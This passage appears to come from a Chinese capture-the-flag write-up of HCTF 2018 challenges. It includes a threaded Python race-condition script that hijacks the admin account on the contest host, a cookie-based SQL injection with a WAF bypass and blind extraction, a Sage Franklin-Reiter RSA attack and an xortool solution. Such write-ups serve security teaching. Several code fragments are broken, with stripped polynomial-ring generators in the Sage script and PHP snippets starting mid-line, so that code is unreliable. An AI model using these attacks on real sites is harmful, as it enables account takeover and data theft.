            session['name'] = name
            user = User.query.filter_by(username=name).first()
            if user is None or not user.check_password(form.password.data):
                flash('Invalid username or password')
                return redirect(url_for('login'))
            login_user(user, remember=form.remember_me.data)
            return redirect(url_for('index'))
        return render_template('login.html', title = 'login', form = form)
    @app.route('/logout')
    def logout():
        logout_user()
        return redirect('/index')
    @app.route('/change', methods = ['GET', 'POST'])
    def change():
        if not current_user.is_authenticated:
            return redirect(url_for('login'))
        form = NewpasswordForm()
        if request.method == 'POST':
            name = strlower(session['name'])
            user = User.query.filter_by(username=name).first()
            user.set_password(form.newpassword.data)
            db.session.commit()
            flash('change successful')
            return redirect(url_for('index'))
        return render_template('change.html', title = 'change', form = form)
    import requests
    import threading
    def login(s, username, password):
        data = {
            'username': username,
            'password': password,
            'submit': ''
        }
        return s.post("http://admin.2018.hctf.io/login", data=data)
    def logout(s):
        return s.get("http://admin.2018.hctf.io/logout")
    def change(s, newpassword):
        data = {
            'newpassword':newpassword
        }
        return s.post("http://admin.2018.hctf.io/change", data=data)
    def func1(s):
        login(s, 'ddd', 'ddd')
        change(s, 'qweqweabcabc')
    def func2(s):
        logout(s)
        res = login(s, 'admin', 'qweqweabcabc')
        if '/index' in res.text:
            print('finish')
    def main():
        for i in range(1000):
            print(i)
            s = requests.Session()
            t1 = threading.Thread(target=func1, args=(s,))
            t2 = threading.Thread(target=func2, args=(s,))
            t1.start()
            t2.start()
    if __name__ == "__main__":
        main()
以修改后的账号即可登录 admin，获得 flag：hctf{un1c0dE_cHe4t_1s_FuNnying}
### kzone
扫描得到后台管理界面和源代码：
进行源码审计，发现 `include/member.php` 存在注入问题：
    get_row("SELECT * FROM fish_admin WHERE username='$admin_user' limit 1");
            if ($udata['username'] == '') {
                setcookie("islogin", "", time() - 604800);
                setcookie("login_data", "", time() - 604800);
            }
            $admin_pass = sha1($udata['password'] . LOGIN_KEY);
            if ($admin_pass == $login_data['admin_pass']) {
                $islogin = 1;
            } else {
                setcookie("islogin", "", time() - 604800);
                setcookie("login_data", "", time() - 604800);
            }
        }
    }
由于 session 是用户可控的，所以我们可以尝试利用 cookie 进行注入。
可以看到校验的方式是 `$admin_pass == $login_data['admin_pass'])`，而用户可以通过 sql 注入的方式控制
`$admin_pass` 最终的值，所以可以实现免密码登录。
可以看到在 safe.php 中定义了 waf 函数：
    |\#|\s/i';
        return preg_replace_callback($blacklist, function ($match) {
            return '@' . $match[0] . '@';
        }, $string);
    }
    function safe($string)
    {
        if (is_array($string)) {
            foreach ($string as $key => $val) {
                $string[$key] = safe($val);
            }
        } else {
            $string = waf($string);
        }
        return $string;
    }
    foreach ($_GET as $key => $value) {
        if (is_string($value) && !is_numeric($value)) {
            $value = safe($value);
        }
        $_GET[$key] = $value;
    }
    foreach ($_POST as $key => $value) {
        if (is_string($value) && !is_numeric($value)) {
            $value = safe($value);
        }
        $_POST[$key] = $value;
    }
    foreach ($_COOKIE as $key => $value) {
        if (is_string($value) && !is_numeric($value)) {
            $value = safe($value);
        }
        $_COOKIE[$key] = $value;
    }
    unset($cplen, $key, $value);
    ?>
但由于 waf 校验在 cookie 的 encode 之前，所以我们可以通过 `\u0000` 来绕过相应校验，如用 `\u0073elect` 来代替
`select`……
成功 SQL 注入后即可登录界面，但发现没有 flag 的存在，所以继续对数据库进行注入。
用于我们可以通过控制该注入点的方式来让用户登录成功 / 失败，所以可以利用盲注来爆破数据库中的字段。最终爆破得到 flag 在数据库的 F1444g 表的
F1a9 列。
得到 flag：HCTF{4526A8CBD741B3F790F95AD32C2514B9}
## Crypto
### xor rsa
题目e=5，给了c1，c2，N  
由代码可知m1与m2只有低40bit不同，因此可用Franklin-Reiter related-message attack  
sage脚本如下：
    e=5
    n1=20742629231167074901872284249900564649960080252421961410962477470471565927514771944304661338404341609414783628297970746610776073149159734189096930913490077819854625407025146808977629912013616078752643824249137727478693289968310457333641028016132389937024763450430409691799006001961811337107714057774370286649194238970511485592863655497660100960378189010168694643224989450676194555927642252615704509481082653495913144303598228023415041745159280660614095057832334431679476668494240579311278072499992891644578697879475129456902830155387123087359027751655458547326317361231930000795672831659962985839689086395870329974041
    C1=13926255851215797638227423248357032856229384483641236490930750938996856149516138371644522381830849845647177176279050178429407921932866351213215077915248020638064714251822408546312164119901382307885745394698913880672129667153776942490301740876735003789389443945545456304418232829018035350821129082356658942389419816333569312829412110417441665206813926688620789109127349596943348372109210292971779503528417388601048246215963785634698250482914621936223888455224299838490075771129583736176437646546700280787052200904680331198079330753470636043214421707013821693830190617850294917741892941811203249208597687587196629043693
    C2=7340149910970749330024189607188363402485839102842010778710351669235006086939568190356751890053962072019106070949559592207192304942387334082180651605264970985577962836722653747701671414017790437995787589011466413002725670413687229770849290494792260148789720869921493279581559461175173686791455519991242940203838847626855840127673081518812045986202817043945401452513644780872244621624942200252617802166996361409813615106748901761657052063859397996684220001907962528397702702479506980088453638748302716156697906474136291137718179751362453892766922155898156542839352088398147730915973258915542456305226006669135165204454
    PRxy. = PolynomialRing(Zmod(n1))
    PRx. = PolynomialRing(Zmod(n1))
    PRZZ. = PolynomialRing(Zmod(n1))
    g1 = x**e - C1
    g2 = (x + y)**e - C2
    q1 = g1.change_ring(PRZZ)
    q2 = g2.change_ring(PRZZ)
    h = q2.resultant(q1)
    # need to switch to univariate polynomial ring
    # because .small_roots is implemented only for univariate
    h = h.univariate_polynomial() # x is hopefully eliminated
    h = h.change_ring(PRx).subs(y=xn)
    h = h.monic()
    print n1.nbits()
    kbits=40
    roots = h.small_roots(X=2^kbits, beta=0.3)
    assert roots, "Failed1"
    diff = roots[0]
    if diff > 2**kbits:
        diff = -diff
        C1, C2 = C2, C1
    print "Difference:", diff
    print "N=",n1
    print "c1=",C1
    print "c2=",C2
    print "r=",diff
    def franklin_reiter(c_array, N, r, e=3):
        P. = PolynomialRing(Zmod(N))
        c1, c2 = c_array
        equations = [x ^ e - c1, (x + r) ^ e - c2]
        g1, g2 = equations
        print(type(g1))
        return -composite_gcd(g1,g2).coefficients()[0]
    def composite_gcd(g1,g2):
        return g1.monic() if g2 == 0 else composite_gcd(g2, g1 % g2)
    e=5
    N= 20742629231167074901872284249900564649960080252421961410962477470471565927514771944304661338404341609414783628297970746610776073149159734189096930913490077819854625407025146808977629912013616078752643824249137727478693289968310457333641028016132389937024763450430409691799006001961811337107714057774370286649194238970511485592863655497660100960378189010168694643224989450676194555927642252615704509481082653495913144303598228023415041745159280660614095057832334431679476668494240579311278072499992891644578697879475129456902830155387123087359027751655458547326317361231930000795672831659962985839689086395870329974041
    c1= 7340149910970749330024189607188363402485839102842010778710351669235006086939568190356751890053962072019106070949559592207192304942387334082180651605264970985577962836722653747701671414017790437995787589011466413002725670413687229770849290494792260148789720869921493279581559461175173686791455519991242940203838847626855840127673081518812045986202817043945401452513644780872244621624942200252617802166996361409813615106748901761657052063859397996684220001907962528397702702479506980088453638748302716156697906474136291137718179751362453892766922155898156542839352088398147730915973258915542456305226006669135165204454
    c2= 13926255851215797638227423248357032856229384483641236490930750938996856149516138371644522381830849845647177176279050178429407921932866351213215077915248020638064714251822408546312164119901382307885745394698913880672129667153776942490301740876735003789389443945545456304418232829018035350821129082356658942389419816333569312829412110417441665206813926688620789109127349596943348372109210292971779503528417388601048246215963785634698250482914621936223888455224299838490075771129583736176437646546700280787052200904680331198079330753470636043214421707013821693830190617850294917741892941811203249208597687587196629043693
    r= 471123279813
    c_array=[c1,c2]
    print(franklin_reiter(c_array,N,r,e=5))
将解出的m1与m2发还给服务器即可获得flag
### xor game
根据题目描述和给出的python脚本可以看出，这道题是把一段poem与flag做了异或加密，并给我们了加密的密文。
由于poem是一段有意义的英文，我们可以用词频分析来解决。
这里我直接用`xortool`，将密文转为hex，指定空格为最常见字符:  
`python xortool -x -c 20 c.txt`
得到key长度为21，和一些看起来很像flag的key：
    The most probable key lengths:
       3:   12.1%
       7:   14.0%
       9:   10.0%
      11:   10.0%
      14:   11.3%
      18:   7.7%
      21:   15.9%
      28:   6.3%
      30:   5.1%
      42:   7.6%
    Key-length can be 3*n
    8 possible key(s) of length 21:
    6o7\x1ai6_i+te7es1ing!@#
    6o7\x1ai6_i+te7es1ing!\x05#
    6o7\x1ai?_i+te7es1ing!@#
    6o7\x1ai?_i+te7es1ing!\x05#
    xo7\x1ai6_i+te7es1ing!@#
    Found 8 plaintexts with 95.0%+ printable characters
    See files filename-key.csv, filename-char_used-perc_printable.csv
在这些key对应解出的明文中可以明显看出一些英文单词的一部分，搜索发现是泰戈尔的生如夏花。
于是直接把原文前21位和密文作异或即可得到flag，补上格式：`hctf{xor_is_interesting!@#}`